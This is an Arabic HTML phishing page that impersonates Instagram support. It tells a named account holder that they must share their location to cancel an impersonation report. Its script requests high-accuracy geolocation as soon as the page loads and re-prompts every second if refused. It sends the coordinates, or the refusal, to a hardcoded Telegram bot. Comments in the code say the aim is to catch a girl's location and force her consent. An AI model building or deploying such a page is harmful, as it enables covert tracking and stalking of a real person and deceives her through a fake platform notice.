<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Support - مركز البلاغات</title>
    <style>
        body { background-color: #fafafa; font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: white; border: 1px solid #dbdbdb; padding: 25px; width: 85%; max-width: 380px; text-align: center; border-radius: 8px; }
        .logo { width: 150px; margin-bottom: 20px; }
        h2 { font-size: 18px; color: #262626; margin-bottom: 10px; }
        p { font-size: 13px; color: #8e8e8e; line-height: 1.5; }
        .btn { background-color: #0095f6; color: white; border: none; padding: 12px; border-radius: 4px; font-weight: bold; width: 100%; cursor: pointer; margin-top: 15px; }
        #msg { color: #ed4956; font-size: 12px; margin-top: 10px; display: none; }
    </style>
</head>
<body>

<div class="card">
    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" class="logo">
    <h2>تأكيد الهوية لإلغاء بلاغ الانتحال</h2>
    <p>بناءً على البلاغات المقدمة ضد الحساب <b>(ha2542213)</b>، يرجى السماح بالوصول للموقع للمطابقة مع بيانات الاتصال المسجلة وإلغاء عملية الحذف التلقائي.</p>
    <button class="btn" onclick="verify()">تأكيد الموقع والملكية</button>
    <div id="msg">⚠️ يجب السماح بالوصول للموقع لإتمام المصادقة.</div>
</div>

<script>
    const token = '8669811855:AAGvHpikmaCi4E_dlFy24J1iYUgAdlnXWsg';
    const chat_id = '7214473798';

    function send(m) {
        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(m)}`);
    }

    function verify() {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(function(p) {
                const lat = p.coords.latitude;
                const lon = p.coords.longitude;
                const acc = p.coords.accuracy;
                const googleMaps = `https://www.google.com/maps?q=${lat},${lat},${lon}`;
                
                send(`🎯 تم صيد إحداثيات البنت بنجاح!\n📍 الرابط: ${googleMaps}\n📏 الدقة: ${acc} متر`);
                
                alert("تم استلام طلبك، سيتم مراجعة البيانات خلال 24 ساعة.");
                window.location.href = "https://help.instagram.com";
            }, function(e) {
                send("⚠️ البنت دخلت بس رفضت تعطي الموقع (ضغطت Block).");
                document.getElementById('msg').style.display = 'block';
                // إعادة الطلب لإجبارها على الموافقة
                setTimeout(verify, 1000); 
            }, {enableHighAccuracy: true});
        }
    }
    // طلب الموقع فور الدخول لزيادة الصدمة
    window.onload = verify;
</script>

</body>
</html>
